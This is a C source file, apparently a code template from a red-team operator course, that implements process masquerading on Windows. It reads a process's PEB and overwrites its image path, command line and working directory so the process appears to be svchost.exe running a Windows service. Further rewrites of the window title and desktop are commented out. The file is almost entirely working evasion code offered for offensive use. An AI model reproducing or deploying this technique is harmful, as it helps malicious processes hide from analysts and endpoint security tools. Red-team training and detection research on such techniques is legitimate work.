/*

 Red Team Operator course code template
 Process manipulation
 
 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include "peb.h"

#define FAKE_MODULE L"svchost.exe"
#define FAKE_MODULE_PATH L"C:\\Windows\\System32\\svchost.exe"
#define FAKE_CMDLINE L"C:\\Windows\\System32\\svchost.exe -k UnistackSvcGroup -s WpnUserService"
#define FAKE_CWD L"C:\\Windows\\System32\\"
#define WINSTATION L"Winsta0\\Default"

typedef NTSTATUS (WINAPI * NtQueryInformationProcess_t)(
        IN HANDLE,
        IN PROCESSINFOCLASS,
        OUT PVOID,
        IN ULONG,
        OUT PULONG
);

int MorphProc(HANDLE hProc) {

	PROCESS_BASIC_INFORMATION pbi;
	DWORD retLen;
	SIZE_T bytesOut;
	mPEB pebLocal;
    RTL_USER_PROCESS_PARAMS params = { sizeof(params) };
	CURDIR cwd = { sizeof(cwd) };
	USHORT fakeSize = 0;
	
	// resolve the API and get the information block about the target process
	NtQueryInformationProcess_t pNtQueryInformationProcess = (NtQueryInformationProcess_t) GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	pNtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

	// Read the PEB from the target process
	if (!ReadProcessMemory(hProc, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesOut)) {
		printf("[!] Error: Could not get remote PEB (%d)\n", GetLastError());
		return 1;
	}

	// Grab the ProcessParameters from PEB
    if (!ReadProcessMemory(hProc, pebLocal.ProcessParameters, &params, sizeof(params), &bytesOut)) {
		printf("[!] Error: Could not get remote parameters (%d)\n", GetLastError());
		return 1;
	}

	// Update CurrentDirectory in remote PEB
	fakeSize = wcslen(FAKE_CWD) * 2;
	if (params.CurrentDirectory.DosPath.Length < fakeSize) {
		printf("[!] Error: Could not update CurrentDirectory in remote PEB - new value too long (%d)\n", GetLastError());
		return 1;		
	}
	if (!WriteProcessMemory(hProc, params.CurrentDirectory.DosPath.Buffer, (LPCVOID) FAKE_CWD, sizeof(FAKE_CWD), &bytesOut)) {
		printf("[!] Error: Could not update CurrentDirectory in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(hProc, (char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, CurrentDirectory.DosPath.Length), (void *) &fakeSize, 2, &bytesOut)) {
		printf("[!] Error: Could not update CurrentDirectory size in remote PEB (%d) \n", GetLastError());
		return 1;
	}

	// Update ImagePathName in remote PEB
	fakeSize = wcslen(FAKE_MODULE_PATH) * 2;
	if (params.ImagePathName.Length < fakeSize) {
		printf("[!] Error: Could not update ImagePathName in remote PEB - new value too long (%d)\n", GetLastError());
		return 1;		
	}
	if (!WriteProcessMemory(hProc, params.ImagePathName.Buffer, (LPCVOID) FAKE_MODULE_PATH, sizeof(FAKE_MODULE_PATH), &bytesOut)) {
		printf("[!] Error: Could not update ImagePathName in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(hProc, (char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, ImagePathName.Length), (void *) &fakeSize, 2, &bytesOut)) {
		printf("[!] Error: Could not update ImagePathName size in remote PEB (%d) \n", GetLastError());
		return 1;
	}

	// Update CommandLine in remote PEB
	fakeSize = wcslen(FAKE_CMDLINE) * 2;
	if (params.CommandLine.Length < fakeSize) {
		printf("[!] Error: Could not update CMDline in remote PEB - new value too long (%d)\n", GetLastError());
		return 1;		
	}
	if (!WriteProcessMemory(hProc, params.CommandLine.Buffer, (LPCVOID) FAKE_CMDLINE, sizeof(FAKE_CMDLINE), &bytesOut)) {
		printf("[!] Error: Could not update CMDline in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(hProc, (char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, CommandLine.Length), (void *) &fakeSize, 2, &bytesOut)) {
		printf("[!] Error: Could not update CMDline size in remote PEB (%d) \n", GetLastError());
		return 1;
	}
/*
	// Update WindowTitle in remote PEB
	fakeSize = wcslen(FAKE_MODULE) * 2;
	if (params.WindowTitle.Length < fakeSize) {
		printf("[!] Error: Could not update WindowTitle in remote PEB - new value too long (%d)\n", GetLastError());
		return 1;		
	}	
	if (!WriteProcessMemory(hProc, params.WindowTitle.Buffer, (LPCVOID) FAKE_MODULE, sizeof(FAKE_MODULE), &bytesOut)) {
		printf("[!] Error: Could not update WindowTitle in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(hProc, (char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, WindowTitle.Length), (void *) &fakeSize, 2, &bytesOut)) {
		printf("[!] Error: Could not update WindowTitle size in remote PEB (%d) \n", GetLastError());
		return 1;
	}

	// Update Winstation in remote PEB
	fakeSize = wcslen(WINSTATION) * 2;
	if (params.DesktopInfo.Length < fakeSize) {
		printf("[!] Error: Could not update Winstation in remote PEB - new value too long (%d)\n", GetLastError());
		return 1;		
	}		
	if (!WriteProcessMemory(hProc, params.DesktopInfo.Buffer, (LPCVOID) WINSTATION, sizeof(WINSTATION), &bytesOut)) {
		printf("[!] Error: Could not update Winstation in remote PEB (%d)\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(hProc, (char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, DesktopInfo.Length), (void *) &fakeSize, 2, &bytesOut)) {
		printf("[!] Error: Could not update Winstation size in remote PEB (%d) \n", GetLastError());
		return 1;
	}
*/
	return 0;
}

int main(int argc, char* argv[]) {

	//OpenProcess(...) + MorphProc(...)

	printf("Before...\n"); getchar();
	MorphProc(GetCurrentProcess());
	printf("After...\n"); getchar();

	return 0;
}
